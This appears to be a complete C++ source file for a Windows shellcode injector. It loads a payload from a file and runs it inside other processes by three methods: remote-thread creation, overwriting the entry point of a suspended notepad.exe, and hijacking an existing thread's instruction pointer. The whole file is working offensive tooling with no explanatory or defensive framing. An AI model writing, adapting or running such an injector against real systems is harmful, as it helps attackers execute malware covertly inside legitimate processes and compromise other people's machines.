#define _CRT_SECURE_NO_WARNINGS

#define IBASE unsigned long

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#pragma comment(lib, "NTDLL")

using namespace std;

void InjectRemoteThread(char *ShellCode, int ShellScope, int PID)
{
	HANDLE Target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(PID));

	PVOID Address = VirtualAllocEx(Target, NULL, ShellScope, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(Target, Address, ShellCode, ShellScope, NULL);

	printf("Injecting PID: %i \n", PID);

	cout << "Shellcode Allocated Address: " << hex << Address << endl;

	HANDLE RemoteThread = CreateRemoteThread(Target, NULL, 0, (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);

	CloseHandle(Target);
}

void InjectEntryPoint(char *ShellCode, int ShellScope)
{
	STARTUPINFOA SI = {};
	PROCESS_INFORMATION PI = {};
	PROCESS_BASIC_INFORMATION PBI = {};

	char Target[] = "C:\\windows\\system32\\notepad.exe";

	CreateProcessA(0, (LPSTR)Target, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &SI, &PI);

	cout << "Created PID: " << PI.dwProcessId << endl;

	NtQueryInformationProcess(PI.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	IBASE PEBOffset = (IBASE)PBI.PebBaseAddress + sizeof(IBASE) * 2;
	
	LPVOID ImageBase = 0;
	ReadProcessMemory(PI.hProcess, (LPCVOID)PEBOffset, &ImageBase, sizeof(IBASE), NULL);
	
	BYTE PEHeaders[4096] = {};
	ReadProcessMemory(PI.hProcess, (LPCVOID)ImageBase, PEHeaders, 4096, NULL);
	
	PIMAGE_DOS_HEADER MZHeader = (PIMAGE_DOS_HEADER)PEHeaders;
	PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)PEHeaders + MZHeader->e_lfanew);
	LPVOID EntryPoint = (LPVOID)(NTHeader->OptionalHeader.AddressOfEntryPoint + (IBASE)ImageBase);

	cout << "Shellcode Allocated Entry: " << EntryPoint << endl;
	
	WriteProcessMemory(PI.hProcess, EntryPoint, ShellCode, ShellScope, NULL);
	ResumeThread(PI.hThread);
}

void HijackRemoteThread(char *ShellCode, int ShellScope, int PID)
{
	HANDLE Target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	PVOID Address = VirtualAllocEx(Target, NULL, ShellScope, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(Target, Address, ShellCode, ShellScope, NULL);

	printf("Injecting PID: %i \n", PID);


	CONTEXT Context;
	Context.ContextFlags = CONTEXT_FULL;

	THREADENTRY32 ThreadEntry;
	ThreadEntry.dwSize = sizeof(THREADENTRY32);

	HANDLE ThreadHijacked = NULL;
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(SnapShot, &ThreadEntry);	

	while (Thread32Next(SnapShot, &ThreadEntry))
	{
		if (ThreadEntry.th32OwnerProcessID == PID)
		{
			ThreadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
			break;
		}
	}

	cout << "Hijack ThreadID: " << ThreadEntry.th32ThreadID << endl;

	SuspendThread(ThreadHijacked);
	
	GetThreadContext(ThreadHijacked, &Context);
	Context.Eip = (DWORD_PTR)Address;
	SetThreadContext(ThreadHijacked, &Context);

	cout << "Shellcode Allocated Address: " << hex << Address << endl;

	ResumeThread(ThreadHijacked);
}


int main(int argc, char **argv)
{
	FILE* File = fopen(argv[3], "rb");

	fseek(File, 0, SEEK_END);

	int ShellScope = ftell(File);

	char* ShellCode = (char*)malloc(sizeof(char) * ShellScope);

	fseek(File, 0, SEEK_SET);

	fread(ShellCode, ShellScope, 1, File);

	fclose(File);


	switch (atoi(argv[1]))
	{
	case 1:
		InjectEntryPoint(ShellCode, ShellScope);
		break;
	case 2:
		InjectRemoteThread(ShellCode, ShellScope, atoi(argv[2]));
		break;
	case 3:
		HijackRemoteThread(ShellCode, ShellScope, atoi(argv[2]));
		break;
	}

	free(ShellCode);
}